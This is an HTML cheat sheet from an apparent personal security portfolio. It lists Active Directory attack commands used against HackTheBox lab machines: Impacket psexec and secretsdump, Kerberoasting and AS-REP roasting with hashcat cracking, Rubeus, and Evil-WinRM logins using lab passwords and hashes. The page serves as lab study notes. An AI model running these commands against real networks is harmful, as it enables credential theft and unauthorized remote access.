<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <meta name="description" content="Windows / AD cheat sheet" />
  <title>Windows & AD Cheat Sheet</title>
  <link rel="stylesheet" href="/assets/css/writeups.css">
</head>
<body class="cheatsheet">
  <!-- moved nav into body and added cheatsheet class on body -->
  <nav class="cheatsheet-navbar">
    <div class="nav-left">
      <a href="index.html" class="nav-logo">Portfolio</a>
    </div>
    <ul class="nav-right">
      <li><a href="../writeups/">Writeups</a></li>
      <li><a href="cheatsheet.html" class="active">Cheatsheets</a></li>
    </ul>
  </nav>

  <header class="site-header">
    <div class="wrap">
      <h1>Windows & Active Directory</h1>
      <nav class="main-nav">
        <ul>
          <li><a href="index.html">Home</a></li>
          <li><a href="recon.html">Recon</a></li>
          <li><a href="windows.html" class="active">Windows</a></li>
          <li><a href="web.html">Web</a></li>
          <li><a href="privesc.html">PrivEsc</a></li>
        </ul>
      </nav>
    </div>
  </header>

  <main class="cheatsheet-content">
    <article>

      <h2>Impacket utilities</h2>

      <h3>mssqlclient.py</h3>
      <div class="code">
        <pre><code>mssqlclient.py manager/operator:operator@manager.htb -windows-auth</code></pre>
      </div>
      <p>Useful commands inside mssqlclient: `enable_xp_cmdshell`, `xp_dirtree \\&lt;share&gt;` (can leak hashes via responder), SQL to list DBs etc.</p>

      <h3>psexec.py / psexec</h3>
      <div class="code">
        <pre><code>psexec.py -hashes &lt;NT HASH&gt;:&lt;NT HASH&gt; administrator@10.10.11.236</code></pre>
      </div>

      <div class="code">
        <pre><code>impacket-psexec manager/administrator:'d0m@in4dminyeah!'@10.10.10.172</code></pre>
      </div>

      <h3>secretsdump.py</h3>
      <div class="code">
        <pre><code>impacket-secretsdump -user-status -history -pwd-last-set administrator.htb/ethan@10.10.11.42</code></pre>
      </div>

      <div class="note">Dumping NTDS using local system boot key (if you have it):</div>
      <div class="code">
        <pre><code>impacket-secretsdump local -system system -ntds ntds.dit</code></pre>
      </div>

      <h2>Kerberos / Kerberoasting / Tickets</h2>

      <h3>Get TGT (impacket-getTGT)</h3>
      <div class="code">
        <pre><code>impacket-getTGT domain/svc_tgs:password -dc-ip &lt;dc_ip&gt;</code></pre>
      </div>

      <h3>GetUserSPNs</h3>
      <div class="code">
        <pre><code>impacket-GetUserSPNs -request -dc-ip &lt;dc_ip&gt; domain/SVC_TGS -save -outputfile GetUserSPNs.out</code></pre>
      </div>

      <h3>Crack Kerberoast TGS</h3>
      <div class="code">
        <pre><code>hashcat -m 13100 GetUserSPNs.out /usr/share/wordlists/rockyou.txt</code></pre>
      </div>

      <h3>Ticket conversion</h3>
      <div class="code">
        <pre><code>impacket-ticketConverter ticket.kirbi ticket.ccache</code></pre>
      </div>

      <h2>Targeted Kerberoast</h2>
      <div class="code">
        <pre><code>python3 targetedKerberoast.py -v -d 'fluffy.htb' -u 'p.agila' -p 'prometheusx-303' -f hashcat</code></pre>
      </div>

      <h2>AS-REP Roasting</h2>
      <div class="code">
        <pre><code>impacket-GetNPUsers -dc-ip &lt;dc_ip&gt; -request 'domain/username'</code></pre>
      </div>

      <div class="code">
        <pre><code>hashcat -m 18200 svc.hash /usr/share/wordlists/rockyou.txt</code></pre>
      </div>

      <h2>Rubeus</h2>
      <div class="code">
        <pre><code>.\Rubeus.exe kerberoast /outfile:hashes.kerberoast</code></pre>
      </div>

      <div class="code">
        <pre><code>.\Rubeus.exe asreproast /nowrap</code></pre>
      </div>

      <h2>Evil-WinRM</h2>
      <div class="code">
        <pre><code>evil-winrm -i 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'</code></pre>
      </div>

      <div class="code">
        <pre><code>evil-winrm -i 10.10.11.236 -H &lt;NT HASH&gt; -u administrator</code></pre>
      </div>

      <div class="note">Cert-based WinRM (5986):</div>
      <div class="code">
        <pre><code>evil-winrm -S -i &lt;ip&gt; -c key.cert -k key.pem</code></pre>
      </div>

      <h2>Notes</h2>
      <ul>
        <li>Save all hashes to files and crack offline with appropriate hash modes.</li>
        <li>For AD CS attacks, confirm CA templates and follow Certipy workflows carefully (add-officer, request, revert UPN, auth).</li>
      </ul>

    </article>
  </main>

  <footer class="site-footer">
    <div class="wrap">
      <p>Â© Rachel Murphy 2025</p>
      <p><a href="index.html">Back</a></p>
    </div>
  </footer>

  <script src="/assets/css/js/script.js"></script>
</body>
</html>
